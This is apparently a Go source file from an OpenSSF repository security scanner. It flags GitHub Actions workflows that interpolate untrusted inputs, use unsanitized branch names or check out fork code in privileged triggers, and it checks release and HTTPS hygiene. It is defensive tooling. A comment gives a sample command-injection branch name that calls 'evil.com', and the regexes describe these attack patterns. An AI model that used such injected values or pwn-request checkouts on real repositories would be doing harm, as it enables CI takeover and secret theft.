package build_release

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"

	"github.com/gemaraproj/go-gemara"
	"github.com/ossf/si-tooling/v2/si"
	"github.com/rhysd/actionlint"

	"github.com/ossf/pvtr-github-repo-scanner/data"
)

// Pre-compiled patterns used by workflow security checks.
var (
	// https://securitylab.github.com/resources/github-actions-untrusted-input/
	// List of untrusted inputs; Global for use in tests also
	untrustedVars = regexp.MustCompile(`.*(github\.event\.issue\.title|` +
		`github\.event\.issue\.body|` +
		`github\.event\.pull_request\.title|` +
		`github\.event\.pull_request\.body|` +
		`github\.event\.comment\.body|` +
		`github\.event\.review\.body|` +
		`github\.event\.pages.*\.page_name|` +
		`github\.event\.commits.*\.message|` +
		`github\.event\.head_commit\.message|` +
		`github\.event\.head_commit\.author\.email|` +
		`github\.event\.head_commit\.author\.name|` +
		`github\.event\.commits.*\.author\.email|` +
		`github\.event\.commits.*\.author\.name|` +
		`github\.event\.pull_request\.head\.ref|` +
		`github\.event\.pull_request\.head\.label|` +
		`github\.event\.pull_request\.head\.repo\.default_branch|` +
		`github\.head_ref).*`)

	// Branch name variables that could be used unsafely in workflow run steps.
	// These are attacker-controllable when a PR is opened from a fork.
	// When used directly in a run: step, GitHub textually injects the branch name
	// into the shell script before execution, allowing command injection via
	// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
	alwaysUnsafeBranchVars = regexp.MustCompile(`.*(github\.head_ref|` +
		`github\.base_ref|` +
		`github\.event\.pull_request\.head\.ref|` +
		`github\.event\.pull_request\.base\.ref).*`)

	// Branch ref variables that are only attacker-controllable in
	// pull_request-triggered workflows. Checked separately so we can
	// skip them for push-triggered workflows and avoid false positives.
	pullRequestOnlyUnsafeBranchVars = regexp.MustCompile(`.*(github\.ref\b|` +
		`github\.ref_name).*`)

	// Refs that point at an untrusted code snapshot (a fork's PR head). Checking
	// any of these out inside a privileged workflow causes untrusted code to run
	// with the base repository's secrets and write token. Covers the PR head
	// context (pull_request_target / issue_comment), the workflow_run head
	// context, and the raw pull/<n>/head|merge refs used with git and the API.
	untrustedHeadRef = regexp.MustCompile(
		`github\.event\.pull_request\.head\.sha|` +
			`github\.event\.pull_request\.head\.ref|` +
			`github\.head_ref|` +
			`github\.event\.workflow_run\.head_sha|` +
			`github\.event\.workflow_run\.head_branch|` +
			`(?:refs/)?pull/[^/]+/(?:head|merge)`)

	// git commands that materialize code into the workspace. Used together with
	// untrustedHeadRef so a benign `git checkout main` is not flagged.
	gitCheckoutCommand = regexp.MustCompile(`(?i)\bgit\s+(?:checkout|switch|fetch)\b`)

	// `gh pr checkout` always fetches and checks out the PR head, so it is
	// dangerous on its own inside a privileged workflow.
	ghPrCheckoutCommand = regexp.MustCompile(`(?i)\bgh\s+pr\s+checkout\b`)

	// Shell command separators let the run-step check correlate a checkout
	// command with the untrusted ref it consumes. Without this, an unrelated
	// `echo github.head_ref` and `git checkout main` elsewhere in the same script
	// would be incorrectly combined into a violation.
	shellCommandSeparator = regexp.MustCompile(`[;\n]|&&|\|\|`)
)

// checkAllWorkflows verifies the payload, iterates over all workflow files, and
// applies checkWorkflow to each parsed workflow. passMessage is returned when all files pass.
func checkAllWorkflows(payload data.Payload, checkWorkflow func(*actionlint.Workflow) (bool, string), passMessage string) (gemara.Result, string, gemara.ConfidenceLevel) {
	var confidence gemara.ConfidenceLevel
	var message string

	workflows, err := payload.GetDirectoryContent(".github/workflows")
	if len(workflows) == 0 {
		if err != nil {
			message = err.Error()
		} else {
			message = "No workflows found in .github/workflows directory"
		}
		return gemara.NotApplicable, message, confidence
	}

	for _, file := range workflows {
		if !strings.HasSuffix(*file.Name, ".yml") && !strings.HasSuffix(*file.Name, ".yaml") {
			continue
		}

		if *file.Encoding != "base64" {
			return gemara.Failed, fmt.Sprintf("File %v is not base64 encoded", file.Name), confidence
		}

		decoded, err := base64.StdEncoding.DecodeString(*file.Content)
		if err != nil {
			return gemara.Failed, fmt.Sprintf("Error decoding workflow file: %v", err), confidence
		}

		workflow, actionError := actionlint.Parse(decoded)
		if actionError != nil {
			return gemara.Failed, fmt.Sprintf("Error parsing workflow: %v (%s)", actionError, *file.Path), confidence
		}

		ok, message := checkWorkflow(workflow)
		if !ok {
			return gemara.Failed, message, confidence
		}
	}

	return gemara.Passed, passMessage, confidence
}

func CicdSanitizedInputParameters(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
	return checkAllWorkflows(payload, checkWorkflowFileForUntrustedInputs,
		"GitHub Workflows variables do not contain untrusted inputs")
}

func CicdBranchNameSanitized(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
	return checkAllWorkflows(payload, checkWorkflowFileForBranchNameUsage,
		"GitHub Workflows do not use unsanitized branch names in run steps")
}

// CicdUntrustedCodeIsolation checks OSPS-BR-01.03: CI/CD pipelines that operate
// on untrusted code snapshots must prevent access to privileged credentials.
//
// The requirement is broad and only partly decidable by static analysis, so the
// result is tiered to ensure a privileged workflow is never silently passed:
//   - Failed: a privileged workflow checks out an untrusted fork's code (the
//     "pwn request" pattern), directly exposing base-repo secrets and token.
//   - NeedsReview: a workflow runs in a privileged context but no dangerous
//     checkout was detected. The residual vectors (see
//     checkWorkflowForUntrustedCodeAccess) are not statically decidable, so a
//     human must confirm the credentials are actually isolated.
//   - Passed: no workflow runs in a privileged context.
//   - NotApplicable: the repository has no workflows.
func CicdUntrustedCodeIsolation(payload data.Payload) (gemara.Result, string, gemara.ConfidenceLevel) {
	var confidence gemara.ConfidenceLevel

	workflows, err := payload.GetDirectoryContent(".github/workflows")
	if len(workflows) == 0 {
		if err != nil {
			return gemara.NotApplicable, err.Error(), confidence
		}
		return gemara.NotApplicable, "No workflows found in .github/workflows directory", confidence
	}

	var parsed []namedWorkflow
	for _, file := range workflows {
		if !strings.HasSuffix(*file.Name, ".yml") && !strings.HasSuffix(*file.Name, ".yaml") {
			continue
		}
		if *file.Encoding != "base64" {
			return gemara.Failed, fmt.Sprintf("File %v is not base64 encoded", *file.Name), confidence
		}
		decoded, decodeErr := base64.StdEncoding.DecodeString(*file.Content)
		if decodeErr != nil {
			return gemara.Failed, fmt.Sprintf("Error decoding workflow file: %v", decodeErr), confidence
		}
		workflow, parseErr := actionlint.Parse(decoded)
		if parseErr != nil {
			return gemara.Failed, fmt.Sprintf("Error parsing workflow: %v (%s)", parseErr, *file.Path), confidence
		}
		parsed = append(parsed, namedWorkflow{name: *file.Name, workflow: workflow})
	}

	result, message := classifyUntrustedCodeIsolation(parsed)
	return result, message, confidence
}

// namedWorkflow pairs a parsed workflow with its filename so aggregate
// diagnostics can point maintainers at the offending file.
type namedWorkflow struct {
	name     string
	workflow *actionlint.Workflow
}

// classifyUntrustedCodeIsolation aggregates the per-workflow findings into the
// tiered OSPS-BR-01.03 verdict documented on CicdUntrustedCodeIsolation. It is
// separated from workflow decoding so the tiering logic is unit-testable without
// a payload fixture.
func classifyUntrustedCodeIsolation(workflows []namedWorkflow) (gemara.Result, string) {
	var violations []string
	var privilegedWorkflows []string

	for _, nw := range workflows {
		privileged, fileViolations := checkWorkflowForUntrustedCodeAccess(nw.workflow)
		if privileged {
			privilegedWorkflows = append(privilegedWorkflows, nw.name)
		}
		violations = append(violations, fileViolations...)
	}

	if len(violations) > 0 {
		return gemara.Failed,
			"CI/CD pipelines expose privileged credentials to untrusted code: " + strings.Join(violations, "; ")
	}

	if len(privilegedWorkflows) > 0 {
		return gemara.NeedsReview, fmt.Sprintf(
			"No untrusted-code checkout was detected, but these workflows run in a privileged context "+
				"(%s); static analysis cannot rule out credential exposure via artifact or cache poisoning, "+
				"self-hosted runners, or untrusted build steps. Manual review required.",
			strings.Join(privilegedWorkflows, ", "))
	}

	return gemara.Passed, "No workflows run untrusted code in a privileged context"
}

// privilegedUntrustedTriggers are workflow events that may execute with access
// to base-repository credentials and can be initiated by an untrusted actor (a
// fork's pull request, a completed workflow, or a comment). Running an untrusted
// code snapshot in these contexts can expose privileged credentials or assets.
var privilegedUntrustedTriggers = map[string]bool{
	"pull_request_target": true,
	"workflow_run":        true,
	"issue_comment":       true,
}

// checkWorkflowForUntrustedCodeAccess reports whether a workflow runs in a
// privileged context and lists every dangerous untrusted-code checkout it
// contains. It detects the "pwn request" family of anti-patterns: a privileged
// workflow (see privilegedUntrustedTriggers) that checks out an untrusted fork's
// code, giving that code access to the base repository's secrets and write
// token, via actions/checkout of an untrusted head ref or an equivalent run:
// step (git checkout/fetch of a PR head, or gh pr checkout).
//
// A privileged workflow with no returned violations is not proven safe: the
// vectors below are not statically decidable and are surfaced by the caller's
// NeedsReview tier rather than passed silently:
//   - workflow_run artifact/cache poisoning (privileged workflow downloading and
//     then executing/trusting artifacts produced by the untrusted run). This is
//     a contextual dataflow judgment, a candidate for an AI-assisted escalation
//     layer built on the sdkai seam once #346 merges.
//   - untrusted fork execution on self-hosted runners. This depends on runner
//     group / fork-secret settings that are not present in the workflow file, so
//     it needs an API-backed data source rather than static analysis or AI.
func checkWorkflowForUntrustedCodeAccess(workflow *actionlint.Workflow) (privileged bool, violations []string) {
	var triggers []string
	for _, event := range workflow.On {
		if privilegedUntrustedTriggers[event.EventName()] {
			triggers = append(triggers, event.EventName())
		}
	}
	if len(triggers) == 0 {
		return false, nil
	}
	trigger := strings.Join(triggers, ", ")

	for _, job := range workflow.Jobs {
		if job == nil {
			continue
		}
		jobID := "unknown"
		if job.ID != nil && job.ID.Value != "" {
			jobID = job.ID.Value
		}
		for _, step := range job.Steps {
			if step == nil {
				continue
			}
			switch exec := step.Exec.(type) {
			case *actionlint.ExecAction:
				if exec.Uses == nil || !isCheckoutAction(exec.Uses.Value) {
					continue
				}
				refInput, ok := exec.Inputs["ref"]
				if !ok || refInput == nil || refInput.Value == nil {
					continue
				}
				if untrustedHeadRef.MatchString(refInput.Value.Value) {
					violations = append(violations, fmt.Sprintf(
						"%s workflow job %q checks out untrusted code (%s) in a privileged context",
						trigger, jobID, strings.TrimSpace(refInput.Value.Value)))
				}
			case *actionlint.ExecRun:
				if exec.Run == nil {
					continue
				}
				if stepChecksOutUntrustedCode(exec.Run.Value) {
					violations = append(violations, fmt.Sprintf(
						"%s workflow job %q checks out untrusted code in a run step in a privileged context",
						trigger, jobID))
				}
			}
		}
	}

	return true, violations
}

func isCheckoutAction(uses string) bool {
	action, _, found := strings.Cut(uses, "@")
	return found && strings.EqualFold(action, "actions/checkout")
}

// stepChecksOutUntrustedCode reports whether a run: script materializes an
// untrusted PR head into the workspace. `gh pr checkout` always targets the PR
// head, so it is flagged unconditionally; git checkout/fetch/switch is flagged
// only when it also references an untrusted head ref, so a benign
// `git checkout main` is not a false positive.
func stepChecksOutUntrustedCode(script string) bool {
	// Preserve line continuations before splitting the script into commands.
	script = strings.ReplaceAll(script, "\\\n", " ")
	for _, command := range shellCommandSeparator.Split(script, -1) {
		if ghPrCheckoutCommand.MatchString(command) {
			return true
		}
		if gitCheckoutCommand.MatchString(command) && untrustedHeadRef.MatchString(command) {
			return true
		}
	}
	return false
}

// checkWorkflowFileForBranchNameUsage checks a workflow for unsanitized branch name
// variables used directly in run: steps, which can lead to command injection.
// It applies two levels of checking:
//   - alwaysUnsafeBranchVars: flagged regardless of trigger type (e.g. github.head_ref)
//   - pullRequestOnlyUnsafeBranchVars: only flagged when the workflow has a
//     pull_request or pull_request_target trigger (e.g. github.ref, github.ref_name)
func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, string) {

	// Determine if the workflow is triggered by pull request events,
	// which makes github.ref and github.ref_name attacker-controllable.
	hasPullRequestTrigger := false
	for _, event := range workflow.On {
		if event.EventName() == "pull_request" || event.EventName() == "pull_request_target" {
			hasPullRequestTrigger = true
			break
		}
	}

	var message strings.Builder

	for _, job := range workflow.Jobs {
		if job == nil {
			continue
		}

		for _, step := range job.Steps {
			if step == nil {
				continue
			}

			run, ok := step.Exec.(*actionlint.ExecRun)
			if !ok || run.Run == nil {
				continue
			}

			varList := pullVariablesFromScript(run.Run.Value)

			for _, name := range varList {
				nameBytes := []byte(name)
				if alwaysUnsafeBranchVars.Match(nameBytes) {
					fmt.Fprintf(&message, "Unsanitized branch name variable found: %v\n", name)
				} else if hasPullRequestTrigger && pullRequestOnlyUnsafeBranchVars.Match(nameBytes) {
					fmt.Fprintf(&message, "Attacker-controllable ref variable in pull_request workflow: %v\n", name)
				}
			}
		}
	}

	if message.Len() > 0 {
		return false, message.String()
	}
	return true, ""
}

// checkWorkflowFileForUntrustedInputs checks a workflow for known untrusted
// GitHub Actions context variables used directly in run: steps.
// These variables (e.g. issue titles, PR bodies, commit messages) are
// user-controllable and can lead to command injection when interpolated
// into shell scripts without sanitization.
func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, string) {

	var message strings.Builder

	for _, job := range workflow.Jobs {
		if job == nil {
			continue
		}

		for _, step := range job.Steps {
			if step == nil {
				continue
			}

			// Only run: steps are vulnerable; action steps use inputs safely.
			run, ok := step.Exec.(*actionlint.ExecRun)
			if !ok || run.Run == nil {
				continue
			}

			// Extract all ${{ ... }} expressions and check against known untrusted inputs.
			varList := pullVariablesFromScript(run.Run.Value)

			for _, name := range varList {
				if untrustedVars.Match([]byte(name)) {
					fmt.Fprintf(&message, "Untrusted input found: %v\n", name)
				}
			}
		}
	}

	if message.Len() > 0 {
		return false, message.String()
	}
	return true, ""

}

// pullVariablesFromScript extracts GitHub Actions expression names from a shell script.
// It finds all ${{ ... }} interpolations and returns the trimmed variable names.
// For example, given `echo ${{ github.head_ref }}`, it returns ["github.head_ref"].
func pullVariablesFromScript(script string) []string {

	varlist := []string{}

	for {

		start := strings.Index(script, "${{")
		if start == -1 {
			break
		}

		end := strings.Index(script[start:], "}}")
		if end == -1 {
			return nil
		}

		varlist = append(varlist, strings.TrimSpace(script[start+3:start+end]))

		script = script[start+end:]

	}

	return varlist

}

func ReleaseHasUniqueIdentifier(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	var noNameCount int
	var sameNameFound []string
	var releaseNames = make(map[string]int)

	for _, release := range payload.Releases {
		if release.Name == "" {
			noNameCount++
		} else if _, ok := releaseNames[release.Name]; ok {
			sameNameFound = append(sameNameFound, release.Name)
		} else {
			releaseNames[release.Name] = release.Id
		}
	}
	if noNameCount > 0 || len(sameNameFound) > 0 {
		sameNames := strings.Join(sameNameFound, ", ")
		message := []string{fmt.Sprintf("Found %v releases with no name", noNameCount)}
		if len(sameNameFound) > 0 {
			message = append(message, fmt.Sprintf("Found %v releases with the same name: %v", len(sameNameFound), sameNames))
		}
		return gemara.Failed, strings.Join(message, ". "), confidence
	}
	return gemara.Passed, "All releases found have a unique name", confidence
}

func getLinks(payload data.Payload) []string {
	ins := payload.Insights
	var links []string

	addURL := func(u si.URL) { links = append(links, string(u)) }
	addURLPtr := func(u *si.URL) {
		if u != nil {
			links = append(links, string(*u))
		}
	}

	addURL(ins.Header.URL)
	addURLPtr(ins.Header.ProjectSISource)
	addURLPtr(ins.Project.HomePage)
	addURLPtr(ins.Project.Roadmap)
	addURLPtr(ins.Project.Funding)
	addURLPtr(ins.Project.Documentation.DetailedGuide)
	addURLPtr(ins.Project.Documentation.CodeOfConduct)
	addURLPtr(ins.Project.Documentation.QuickstartGuide)
	addURLPtr(ins.Project.Documentation.ReleaseProcess)
	addURLPtr(ins.Project.Documentation.SignatureVerification)
	addURLPtr(ins.Project.VulnerabilityReporting.BugBountyProgram)
	addURLPtr(ins.Project.VulnerabilityReporting.Policy)
	addURL(ins.Repository.Url)
	addURL(ins.Repository.License.Url)
	addURLPtr(ins.Repository.SecurityPosture.Assessments.Self.Evidence)

	if payload.RepositoryMetadata.OrganizationBlogURL() != nil {
		links = append(links, *payload.RepositoryMetadata.OrganizationBlogURL())
	}
	for _, repo := range ins.Project.Repositories {
		addURL(repo.Url)
	}
	for _, assessment := range ins.Repository.SecurityPosture.Assessments.ThirdPartyAssessment {
		addURLPtr(assessment.Evidence)
	}
	for _, tool := range ins.Repository.SecurityPosture.Tools {
		if tool.Results.Adhoc != nil {
			addURL(tool.Results.Adhoc.Location)
		}
		if tool.Results.CI != nil {
			addURL(tool.Results.CI.Location)
		}
		if tool.Results.Release != nil {
			addURL(tool.Results.Release.Location)
		}
	}
	return links
}

func insecureURI(uri string) bool {
	if strings.TrimSpace(uri) == "" ||
		strings.HasPrefix(uri, "https://") ||
		strings.HasPrefix(uri, "ssh:") ||
		strings.HasPrefix(uri, "git:") ||
		strings.HasPrefix(uri, "git@") {
		return false
	}
	return true
}

func EnsureInsightsLinksUseHTTPS(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	links := getLinks(payload)
	var badURIs []string
	for _, link := range links {
		if insecureURI(link) {
			badURIs = append(badURIs, link)
		}
	}
	if len(badURIs) > 0 {
		return gemara.Failed, fmt.Sprintf("The following links do not use HTTPS: %v", strings.Join(badURIs, ", ")), confidence
	}
	return gemara.Passed, "All links use HTTPS", confidence
}

func EnsureLatestReleaseHasChangelog(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	releaseDescription := payload.Repository.LatestRelease.Description
	if strings.Contains(releaseDescription, "Change Log") || strings.Contains(releaseDescription, "Changelog") {
		return gemara.Passed, "Mention of a changelog found in the latest release", confidence
	}
	return gemara.Failed, "The latest release does not have mention of a changelog: \n" + releaseDescription, confidence
}

func InsightsHasSlsaAttestation(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	attestations := payload.Insights.Repository.ReleaseDetails.Attestations

	for _, attestation := range attestations {
		if attestation.PredicateURI == "https://slsa.dev/provenance/v1" {
			return gemara.Passed, "Found SLSA attestation in security insights", confidence
		}
	}
	return gemara.Failed, "No SLSA attestation found in security insights", confidence
}

func DistributionPointsUseHTTPS(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	distributionPoints := payload.Insights.Repository.ReleaseDetails.DistributionPoints

	if len(distributionPoints) == 0 {
		return gemara.NotApplicable, "No official distribution points found in Security Insights data", confidence
	}

	var badURIs []string
	for _, point := range distributionPoints {
		if insecureURI(point.Uri) {
			badURIs = append(badURIs, point.Uri)
		}
	}
	if len(badURIs) > 0 {
		return gemara.Failed, fmt.Sprintf("The following distribution points do not use HTTPS: %v", strings.Join(badURIs, ", ")), confidence
	}
	return gemara.Passed, "All distribution points use HTTPS", confidence
}

func SecretScanningInUse(payload data.Payload) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
	if payload.SecurityPosture.PreventsPushingSecrets() && payload.SecurityPosture.ScansForSecrets() {
		return gemara.Passed, "Secret scanning is enabled and prevents pushing secrets", confidence
	} else if payload.SecurityPosture.PreventsPushingSecrets() || payload.SecurityPosture.ScansForSecrets() {
		return gemara.Failed, "Secret scanning is only partially enabled", confidence
	} else {
		return gemara.Failed, "Secret scanning is not enabled", confidence
	}
}
